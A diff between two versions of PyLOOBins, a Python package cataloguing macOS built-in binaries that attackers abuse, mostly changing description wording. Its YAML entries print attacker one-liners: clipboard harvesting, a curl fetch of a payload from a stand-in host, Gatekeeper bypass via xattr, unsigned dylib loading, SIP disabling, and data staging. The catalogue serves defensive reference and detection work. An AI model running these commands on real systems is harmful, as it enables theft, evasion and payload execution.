# Comparing `tmp/pyloobins-0.1.9.tar.gz` & `tmp/pyloobins-1.0.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyloobins-0.1.9.tar", max compression
+gzip compressed data, was "pyloobins-1.0.0.tar", max compression
```

## Comparing `pyloobins-0.1.9.tar` & `pyloobins-1.0.0.tar`

### file list

```diff
@@ -1,38 +1,43 @@
--rw-r--r--   0        0        0    35149 2023-04-11 23:56:04.085551 pyloobins-0.1.9/LICENSE
--rw-r--r--   0        0        0      885 2023-05-01 23:30:07.408912 pyloobins-0.1.9/LOOBins/GetFileInfo.yml
--rw-r--r--   0        0        0     1412 2023-05-01 23:30:07.409275 pyloobins-0.1.9/LOOBins/SetFile.yml
--rw-r--r--   0        0        0     1410 2023-05-17 23:34:53.847985 pyloobins-0.1.9/LOOBins/csrutil.yml
--rw-r--r--   0        0        0     2449 2023-05-08 00:30:49.737329 pyloobins-0.1.9/LOOBins/ditto.yml
--rw-r--r--   0        0        0     1644 2023-05-20 14:12:36.410173 pyloobins-0.1.9/LOOBins/dns-sd.yml
--rw-r--r--   0        0        0     3545 2023-05-01 23:30:07.409751 pyloobins-0.1.9/LOOBins/dscl.yml
--rw-r--r--   0        0        0     2046 2023-05-23 12:32:36.331097 pyloobins-0.1.9/LOOBins/hdiutil.yml
--rw-r--r--   0        0        0     2138 2023-05-01 23:30:07.409978 pyloobins-0.1.9/LOOBins/ioreg.yml
--rw-r--r--   0        0        0     1538 2023-05-01 01:46:27.775139 pyloobins-0.1.9/LOOBins/last.yml
--rw-r--r--   0        0        0     1869 2023-05-17 23:34:53.848702 pyloobins-0.1.9/LOOBins/lsregister.yml
--rw-r--r--   0        0        0     1763 2023-05-14 23:57:44.222650 pyloobins-0.1.9/LOOBins/mdfind.yml
--rw-r--r--   0        0        0     4420 2023-05-01 23:30:07.410858 pyloobins-0.1.9/LOOBins/networksetup.yml
--rw-r--r--   0        0        0      753 2023-05-23 12:32:36.331361 pyloobins-0.1.9/LOOBins/nscurl.yml
--rw-r--r--   0        0        0      868 2023-05-15 00:11:31.657614 pyloobins-0.1.9/LOOBins/open.yml
--rw-r--r--   0        0        0     1229 2023-05-15 23:03:47.041630 pyloobins-0.1.9/LOOBins/osacompile.yml
--rw-r--r--   0        0        0     3237 2023-05-01 23:30:07.411097 pyloobins-0.1.9/LOOBins/osascript.yml
--rw-r--r--   0        0        0     1263 2023-05-01 23:30:07.411462 pyloobins-0.1.9/LOOBins/pbpaste.yml
--rw-r--r--   0        0        0     1259 2023-05-11 01:22:04.795362 pyloobins-0.1.9/LOOBins/plutil.yml
--rw-r--r--   0        0        0     1249 2023-05-17 23:34:53.848926 pyloobins-0.1.9/LOOBins/profiles.yml
--rw-r--r--   0        0        0     1206 2023-05-21 12:51:13.791530 pyloobins-0.1.9/LOOBins/safaridriver.yml
--rw-r--r--   0        0        0     1051 2023-05-01 01:46:27.801548 pyloobins-0.1.9/LOOBins/screencapture.yml
--rw-r--r--   0        0        0     2458 2023-05-01 01:46:27.474479 pyloobins-0.1.9/LOOBins/security.yml
--rw-r--r--   0        0        0      840 2023-05-01 23:30:07.411670 pyloobins-0.1.9/LOOBins/softwareupdate.yml
--rw-r--r--   0        0        0     1118 2023-05-23 12:32:36.331549 pyloobins-0.1.9/LOOBins/ssh-keygen.yml
--rw-r--r--   0        0        0      790 2023-05-01 23:30:07.411980 pyloobins-0.1.9/LOOBins/sysctl.yml
--rw-r--r--   0        0        0     1158 2023-05-18 14:49:43.472269 pyloobins-0.1.9/LOOBins/tclsh.yml
--rw-r--r--   0        0        0     1993 2023-05-11 01:17:33.005665 pyloobins-0.1.9/LOOBins/textutil.yml
--rw-r--r--   0        0        0     2034 2023-05-06 18:13:38.210711 pyloobins-0.1.9/LOOBins/tmutil.yml
--rw-r--r--   0        0        0     1636 2023-04-23 17:34:43.219172 pyloobins-0.1.9/LOOBins/xattr.yml
--rw-r--r--   0        0        0     1011 2023-05-21 12:12:36.819967 pyloobins-0.1.9/docs/pyloobins/README.md
--rw-r--r--   0        0        0     1227 2023-05-23 12:32:36.331803 pyloobins-0.1.9/pyproject.toml
--rw-r--r--   0        0        0        0 2023-04-07 02:06:55.452190 pyloobins-0.1.9/src/pyloobins/__init__.py
--rw-r--r--   0        0        0     2182 2023-05-21 12:27:21.858770 pyloobins-0.1.9/src/pyloobins/cli.py
--rw-r--r--   0        0        0     4015 2023-05-15 23:42:52.127853 pyloobins-0.1.9/src/pyloobins/models.py
--rw-r--r--   0        0        0     1311 2023-05-01 23:30:07.412430 pyloobins-0.1.9/src/pyloobins/templates/loobin.md.j2
--rw-r--r--   0        0        0     2768 2023-05-23 12:32:36.332053 pyloobins-0.1.9/src/pyloobins/util.py
--rw-r--r--   0        0        0     1894 1970-01-01 00:00:00.000000 pyloobins-0.1.9/PKG-INFO
+-rw-r--r--   0        0        0    35149 2023-04-11 23:56:04.085551 pyloobins-1.0.0/LICENSE
+-rw-r--r--   0        0        0      875 2023-05-24 23:37:10.110933 pyloobins-1.0.0/LOOBins/GetFileInfo.yml
+-rw-r--r--   0        0        0     1402 2023-05-24 23:37:10.111070 pyloobins-1.0.0/LOOBins/SetFile.yml
+-rw-r--r--   0        0        0     1411 2023-05-24 23:37:10.111197 pyloobins-1.0.0/LOOBins/csrutil.yml
+-rw-r--r--   0        0        0     1368 2023-05-24 23:37:10.111293 pyloobins-1.0.0/LOOBins/defaults.yml
+-rw-r--r--   0        0        0     2447 2023-05-24 23:37:10.111425 pyloobins-1.0.0/LOOBins/ditto.yml
+-rw-r--r--   0        0        0     1644 2023-05-20 14:12:36.410173 pyloobins-1.0.0/LOOBins/dns-sd.yml
+-rw-r--r--   0        0        0     3538 2023-05-24 23:37:10.111714 pyloobins-1.0.0/LOOBins/dscl.yml
+-rw-r--r--   0        0        0     1098 2023-05-24 23:37:10.112031 pyloobins-1.0.0/LOOBins/dsexport.yml
+-rw-r--r--   0        0        0     2044 2023-05-24 23:37:10.112237 pyloobins-1.0.0/LOOBins/hdiutil.yml
+-rw-r--r--   0        0        0     2138 2023-05-01 23:30:07.409978 pyloobins-1.0.0/LOOBins/ioreg.yml
+-rw-r--r--   0        0        0     1531 2023-05-24 23:37:10.112390 pyloobins-1.0.0/LOOBins/last.yml
+-rw-r--r--   0        0        0     1869 2023-05-17 23:34:53.848702 pyloobins-1.0.0/LOOBins/lsregister.yml
+-rw-r--r--   0        0        0     1792 2023-05-24 23:37:10.112539 pyloobins-1.0.0/LOOBins/mdfind.yml
+-rw-r--r--   0        0        0     4420 2023-05-24 23:37:10.112698 pyloobins-1.0.0/LOOBins/networksetup.yml
+-rw-r--r--   0        0        0      754 2023-05-24 23:37:10.112846 pyloobins-1.0.0/LOOBins/nscurl.yml
+-rw-r--r--   0        0        0      689 2023-05-24 23:37:10.113111 pyloobins-1.0.0/LOOBins/nvram.yml
+-rw-r--r--   0        0        0      939 2023-05-24 23:37:10.113586 pyloobins-1.0.0/LOOBins/open.yml
+-rw-r--r--   0        0        0     1292 2023-05-24 23:37:10.113900 pyloobins-1.0.0/LOOBins/osacompile.yml
+-rw-r--r--   0        0        0     3236 2023-05-24 23:37:10.114203 pyloobins-1.0.0/LOOBins/osascript.yml
+-rw-r--r--   0        0        0     1263 2023-05-01 23:30:07.411462 pyloobins-1.0.0/LOOBins/pbpaste.yml
+-rw-r--r--   0        0        0     1259 2023-05-11 01:22:04.795362 pyloobins-1.0.0/LOOBins/plutil.yml
+-rw-r--r--   0        0        0     1249 2023-05-17 23:34:53.848926 pyloobins-1.0.0/LOOBins/profiles.yml
+-rw-r--r--   0        0        0     1206 2023-05-21 12:51:13.791530 pyloobins-1.0.0/LOOBins/safaridriver.yml
+-rw-r--r--   0        0        0     1051 2023-05-01 01:46:27.801548 pyloobins-1.0.0/LOOBins/screencapture.yml
+-rw-r--r--   0        0        0     2458 2023-05-01 01:46:27.474479 pyloobins-1.0.0/LOOBins/security.yml
+-rw-r--r--   0        0        0      864 2023-05-24 23:37:10.114367 pyloobins-1.0.0/LOOBins/softwareupdate.yml
+-rw-r--r--   0        0        0     1114 2023-05-24 23:37:10.114561 pyloobins-1.0.0/LOOBins/spctl.yml
+-rw-r--r--   0        0        0     2423 2023-05-24 23:37:10.114881 pyloobins-1.0.0/LOOBins/sqlite3.yml
+-rw-r--r--   0        0        0     1118 2023-05-24 23:37:10.115141 pyloobins-1.0.0/LOOBins/ssh-keygen.yml
+-rw-r--r--   0        0        0      790 2023-05-01 23:30:07.411980 pyloobins-1.0.0/LOOBins/sysctl.yml
+-rw-r--r--   0        0        0     1159 2023-05-24 23:37:10.115266 pyloobins-1.0.0/LOOBins/tclsh.yml
+-rw-r--r--   0        0        0     1993 2023-05-11 01:17:33.005665 pyloobins-1.0.0/LOOBins/textutil.yml
+-rw-r--r--   0        0        0     2021 2023-05-24 23:37:10.115401 pyloobins-1.0.0/LOOBins/tmutil.yml
+-rw-r--r--   0        0        0     1637 2023-05-24 23:37:10.115532 pyloobins-1.0.0/LOOBins/xattr.yml
+-rw-r--r--   0        0        0     2863 2023-05-24 23:37:10.116085 pyloobins-1.0.0/docs/pyloobins/README.md
+-rw-r--r--   0        0        0     1227 2023-05-24 23:37:10.116236 pyloobins-1.0.0/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-04-07 02:06:55.452190 pyloobins-1.0.0/src/pyloobins/__init__.py
+-rw-r--r--   0        0        0     2182 2023-05-21 12:27:21.858770 pyloobins-1.0.0/src/pyloobins/cli.py
+-rw-r--r--   0        0        0     4015 2023-05-15 23:42:52.127853 pyloobins-1.0.0/src/pyloobins/models.py
+-rw-r--r--   0        0        0     1311 2023-05-01 23:30:07.412430 pyloobins-1.0.0/src/pyloobins/templates/loobin.md.j2
+-rw-r--r--   0        0        0     2768 2023-05-23 12:32:36.332053 pyloobins-1.0.0/src/pyloobins/util.py
+-rw-r--r--   0        0        0     3746 1970-01-01 00:00:00.000000 pyloobins-1.0.0/PKG-INFO
```

### Comparing `pyloobins-0.1.9/LICENSE` & `pyloobins-1.0.0/LICENSE`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/GetFileInfo.yml` & `pyloobins-1.0.0/LOOBins/GetFileInfo.yml`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: GetFileInfo
 author: Chris Campbell (@texasbe2trill)
-short_description: A tool to get attributes of files and directories.
+short_description: Get attributes of files and directories.
 full_description: Uses the CommandLine/Terminal to return type, creator, attributes, created, and modified file information of a file or directory.
 created: 2023-04-23
 example_use_cases:
   - name: Iterate through a directory to GetFileInfo
     description: A bash or zsh oneliner can provide an attacker with information about specific files of interest.
     code: for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done
     tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/SetFile.yml` & `pyloobins-1.0.0/LOOBins/SetFile.yml`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: SetFile
 author: Chris Campbell (@texasbe2trill)
-short_description: A tool to set attributes of files and directories.
+short_description: Set attributes of files and directories.
 full_description: Uses the CommandLine/Terminal to set file and or directory attributes. It can set attributes, creator, creation date, modification date, and file type for multiple files at a time.
 created: 2023-04-23
 example_use_cases:
   - name: Set a file or directory attribute to invisible
     description: A bash or zsh oneliner can allow an attacker to set the file attribute to invisible. This action can establish persistence and evade detection for malicious files on the system.
     code: for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done
     tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/csrutil.yml` & `pyloobins-1.0.0/LOOBins/csrutil.yml`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: csrutil
 author: Megan Carney (https://infosec.exchange/@PwnieFan)
-short_description: Configure or view system security policies
+short_description: Configure or view system security policies.
 full_description: Used to enable/disable SIP, configure netboot and authenticated-root settings 
 created: 2023-05-14
 example_use_cases:
   - name: Disable SIP
     description: disable SIP (System Integrity Protection) - requires booting into recovery mode
     code: csrutil disable
     tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/ditto.yml` & `pyloobins-1.0.0/LOOBins/ditto.yml`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: ditto
 author: Brendan Chamberlain (@infosecB)
-short_description: Copies files and directories while preserving file attributes and permissions.
+short_description: Copy files and directories while preserving file attributes and permissions.
 full_description: ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes and permissions. The tool can be used by malicious actors to collect and exfiltrate sensitive data, move laterally, and/or perform DLL hijacking or binary replacement attacks.
 created: 2023-05-04
 example_use_cases:
 - name: Copy and compress sensitive data locally
   description: The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.
   code: ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip
   tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/dns-sd.yml` & `pyloobins-1.0.0/LOOBins/dns-sd.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/dscl.yml` & `pyloobins-1.0.0/LOOBins/dscl.yml`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: dscl
 author: Jonathan Bar Or (@yo_yo_yo_jbo)
-short_description: Directory Services command-line utility.
+short_description: Interact with Directory Services.
 full_description: An extensive tool for communicating with the Directory Services, useful for Discovery.
 created: 2023-04-25
 example_use_cases:
   - name: Local user enumeration
     description: Enumerate all local users.
     code: dscl . -list /Users
     tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/hdiutil.yml` & `pyloobins-1.0.0/LOOBins/hdiutil.yml`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: hdiutil
 author: Mark Morowczynsk (@markmorow)
-short_description: Uses the DiskImages framework to manipulate disk images
+short_description: Manipulate disk images using the DiskImages framework.
 full_description: hdiutil manipulates disk images such as DMG and ISO files. You can mount, unmount, create, resize and verify disk images. Including encrypted images.  
 created: 2023-05-21
 example_use_cases:
 - name: Mount a malicious dmg file
   description: Uses hdiutil to mount a malicious dmg file to 
   code: hdiutil mount malicious.dmg
   tactics:
@@ -62,8 +62,7 @@
 - /usr/bin/hdiutil
 detections:
 - name: No detections at time of publishing
   url: n/a
 resources:
 - name: 'Microsoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection'
   url: https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/
-
```

### Comparing `pyloobins-0.1.9/LOOBins/ioreg.yml` & `pyloobins-1.0.0/LOOBins/ioreg.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/last.yml` & `pyloobins-1.0.0/LOOBins/last.yml`

 * *Files 8% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: last
 author: Will Huang (@In0de_16)
-short_description: Indicate last logins of users and ttys.
+short_description: Show last user logins and TTYs.
 full_description: The command shows a list of user sessions including the user name, terminal used, host name, start and stop times, and duration. It also indicates if a session is still active or was terminated unexpectedly.
 created: 2023-04-27
 example_use_cases:
 - name: Enumerate the users who are currently logged into the system.
   description: The following command will display sessions that are currently active.
   code: last | grep "still logged in"
   tactics:
@@ -31,8 +31,8 @@
 paths:
 - /usr/bin/last
 detections:
 - name: "System Network Connections Discovery"
   url: https://github.com/SigmaHQ/sigma/blob/master/rules/macos/process_creation/proc_creation_macos_system_network_connections_discovery.yml
 resources:
 - name: "last Man Page"
-  url: https://ss64.com/osx/last.html
+  url: https://ss64.com/osx/last.html
```

### Comparing `pyloobins-0.1.9/LOOBins/lsregister.yml` & `pyloobins-1.0.0/LOOBins/lsregister.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/mdfind.yml` & `pyloobins-1.0.0/LOOBins/mdfind.yml`

 * *Files 4% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 name: mdfind
 author: Chris Campbell (@texasbe2trill)
-short_description: CommandLine alternative to Spotlight in MacOS
-full_description: Uses the CommandLine/Terminal to locate files on MacOS by searching a pre-built database.
+short_description: Locate files using the Spotlight database.
+full_description: mdfind to locate files on MacOS by searching a pre-built database. It is a command-line alternative to Spotlight in MacOS
 created: 2023-04-22
 example_use_cases:
   - name: Use mdfind to provide live updates to the number of files matching the query
     description: A bash or zsh oneliner can cause mdfind to provide an attacker with live updates to the number of files on a system.
     code: mdfind -live passw
     tactics:
       - Reconnaissance
```

### Comparing `pyloobins-0.1.9/LOOBins/networksetup.yml` & `pyloobins-1.0.0/LOOBins/networksetup.yml`

 * *Files 4% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 name: networksetup
 author: Jason Trost (@jason_trost)
-short_description: configuration tool for network settings in System Preferences.
-full_description: extensive tool for reading and setting various network configuration details useful for Discovery and Command and Control.
+short_description: Configure network settings in System Preferences.
+full_description: networksetup extensive tool for reading and setting various network configuration details useful for Discovery and Command and Control.
 created: 2023-04-22
 example_use_cases:
   - name: network device enumeration
     description: Use networksetup to display services with corresponding port and device in order they are tried for connecting to a network.
     code: networksetup -listnetworkserviceorder
     tactics:
       - Discovery
```

### Comparing `pyloobins-0.1.9/LOOBins/nscurl.yml` & `pyloobins-1.0.0/LOOBins/nscurl.yml`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: nscurl
 author: Leo Pitt (@_D00mfist)
-short_description: Download, upload, and read files
+short_description: Download, upload, and read files.
 full_description: macOS version of curl that is used to download files to a target without applying the quarantine extended attribute
 created: 2023-05-22
 example_use_cases:
   - name: Download file
     description: Download file and ignore cert checking 
     code: nscurl -k https://google.com -o /private/tmp/google
     tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/open.yml` & `pyloobins-1.0.0/LOOBins/open.yml`

 * *Files 9% similar despite different names*

```diff
@@ -1,11 +1,11 @@
 name: open
 author: Brendan Chamberlain (@infosecb)
 short_description: Open files, folders, apps, URLs, and header files.
-full_description: A full length description of the binary goes here.
+full_description: The open command-line utility can be used to open files, folders, app, URLs or header files in their associate macOS app.
 created: 2023-05-10
 example_use_cases:
 - name: Open a malicious file
   description: The open command can be used to open a malicious macOS app from the terminal.
   code: open Malicious.app
   tactics:
   - Execution
```

### Comparing `pyloobins-0.1.9/LOOBins/osacompile.yml` & `pyloobins-1.0.0/LOOBins/osacompile.yml`

 * *Files 11% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 name: osacompile
 author: Brendan Chamberlain (@infosecB)
 short_description: Compile AppleScripts or OSA language scripts.
 full_description: osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OSA) that Apple uses for its scripting languages, like AppleScript and JavaScript for Automation (JXA). osacompile accepts AppleScript code as input and produces a compiled script file, which can be either a script file (.scpt), an app (.app), a droplet, or a script bundle.
 created: 2023-05-14
 example_use_cases:
 - name: Download and compile a payload
-  description: A description of the use case goes here.
+  description: The following command downloads an applescript payload from getpayload.com and compiles it into an app.
   code: curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app
   tactics:
   - Discovery
   tags:
   - XCSSET
 paths:
 - /usr/bin/osacompile
```

### Comparing `pyloobins-0.1.9/LOOBins/osascript.yml` & `pyloobins-1.0.0/LOOBins/osascript.yml`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: osascript
 author: Cedric Owens (@cedowens)
-short_description: Executes AppleScripts and other OSA language scripts and commands.
+short_description: Execute AppleScripts and other OSA language scripts and commands.
 full_description: The osascript binary is a command-line utility included in macOS that allows users to run AppleScript and Open Scripting Architecture (OSA) scripts or commands. AppleScript is a scripting language that is designed for power users to automate various tasks, application actions, and to interact with the operating system.
 created: 2023-04-19
 example_use_cases:
   - name: Use the osascript binary to gather sensitive clipboard data  
     description: A bash loop can gather clipboard contents over a defined time period. The following command calls /usr/bin/osascript -e 'return (the clipboard)' indefinitely every 10 seconds and writes clipboard content to a text file.  
     code: while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done  
     tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/pbpaste.yml` & `pyloobins-1.0.0/LOOBins/pbpaste.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/plutil.yml` & `pyloobins-1.0.0/LOOBins/plutil.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/profiles.yml` & `pyloobins-1.0.0/LOOBins/profiles.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/safaridriver.yml` & `pyloobins-1.0.0/LOOBins/safaridriver.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/screencapture.yml` & `pyloobins-1.0.0/LOOBins/screencapture.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/security.yml` & `pyloobins-1.0.0/LOOBins/security.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/softwareupdate.yml` & `pyloobins-1.0.0/LOOBins/softwareupdate.yml`

 * *Files 12% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: softwareupdate
 author: Jonathan Bar Or (@yo_yo_yo_jbo)
-short_description: Software update utility.
+short_description: Interact with the macOS software update service.
 full_description: A command-line utility for running software updates.
 created: 2023-04-25
 example_use_cases:
   - name: Get OS and browser version information
     description: Determine OS and Safari version by enumerating the available software updates.
     code: softwareupdate --list
     tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/ssh-keygen.yml` & `pyloobins-1.0.0/LOOBins/ssh-keygen.yml`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: ssh-keygen
 author: Leo Pitt (@_D00mfist)
-short_description: Load unsigned dynamic libraries into the ssh-keygen binary 
+short_description: Load unsigned dynamic libraries into the ssh-keygen binary.
 full_description: ssh-keygen is a tool for creating new authentication key pairs for SSH (Secure Shell). ssh-keygen holds the "com.apple.security.cs.disable-library-validation" entitlement and is capable of loading arbitary libraries without requiring signed code.
 created: 2023-05-22
 example_use_cases:
 - name: Execute malicious dynamic library (.dylib) from standard input
   description: An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.
   code:  ssh-keygen -D /private/tmp/evil.dylib
   tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/sysctl.yml` & `pyloobins-1.0.0/LOOBins/sysctl.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/tclsh.yml` & `pyloobins-1.0.0/LOOBins/tclsh.yml`

 * *Files 9% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: tclsh
 author: Brendan Chamberlain (@infosecB)
-short_description: Run Tcl files or shell commands from standard input
+short_description: Run Tcl files or shell commands from standard input.
 full_description: tclsh is a shell-like utility that runs Tcl from standard input or a file. tclsh holds the "com.apple.security.cs.disable-library-validation" entitlement and is capable of loading arbitary plug-ins, framework, and libraries without requiring signed code.
 created: 2023-05-17
 example_use_cases:
 - name: Execute malicious dynamic library (.dylib) from standard input
   description: An attacker can execute a malicious .dylib from stdin by echoing a load command and piping to tclsh. This will bypass code signing requirements.
   code:  echo "load bad.dylib" | tclsh
   tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/textutil.yml` & `pyloobins-1.0.0/LOOBins/textutil.yml`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/LOOBins/tmutil.yml` & `pyloobins-1.0.0/LOOBins/tmutil.yml`

 * *Files 5% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: tmutil
 author: Brendan Chamberlain (@infosecb)
-short_description: A tool for managing Time Machine backups.
+short_description: Manage Time Machine backups.
 full_description: A tool for managing Time Machine, the native macOS backup utility. 
 created: 2023-05-01
 example_use_cases:
 - name: Disable Time Machine
   description: The following command disables Time Machine. An attacker can use this to prevent backups from occurring.
   code: tmutil disable
   tactics:
```

### Comparing `pyloobins-0.1.9/LOOBins/xattr.yml` & `pyloobins-1.0.0/LOOBins/xattr.yml`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 name: xattr
 author: Jason Trost (@jason_trost)
-short_description: display and manipulate extended attributes
+short_description: Display and manipulate extended attributes.
 full_description: The xattr command can be used to display, modify or remove the extended attributes of one or more files, including directories and symbolic links.  Extended attributes are arbitrary metadata stored with a file, but separate from the filesystem attributes (such as modification time or file size).  The metadata is often a null-terminated UTF-8 string, but can also be arbitrary binary data.  xattr can be used to bypass Gatekeeper.
 created: 2023-04-20
 example_use_cases:
 - name: Bypass Gatekeeper via xattr
   description: Use xattr to remove quaratine extended attribute from a file.
   code: xattr -d com.apple.quarantine FILE
   tactics:
```

### Comparing `pyloobins-0.1.9/pyproject.toml` & `pyloobins-1.0.0/pyproject.toml`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 [tool.poetry]
 name = "PyLOOBins"
-version = "0.1.9"
+version = "1.0.0"
 description = "Python package for managing the LOOBins model and schema."
 authors = ["infosecB <brendan@infosecb.com>"]
 readme = "docs/pyloobins/README.md"
 packages = [{include = "pyloobins", from = "src"}]
 include = ["LOOBins/*.yml"]
 homepage = "https://loobins.io/"
 repository = "https://github.com/infosecB/LOOBins"
```

### Comparing `pyloobins-0.1.9/src/pyloobins/cli.py` & `pyloobins-1.0.0/src/pyloobins/cli.py`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/src/pyloobins/models.py` & `pyloobins-1.0.0/src/pyloobins/models.py`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/src/pyloobins/templates/loobin.md.j2` & `pyloobins-1.0.0/src/pyloobins/templates/loobin.md.j2`

 * *Files identical despite different names*

### Comparing `pyloobins-0.1.9/src/pyloobins/util.py` & `pyloobins-1.0.0/src/pyloobins/util.py`

 * *Files identical despite different names*

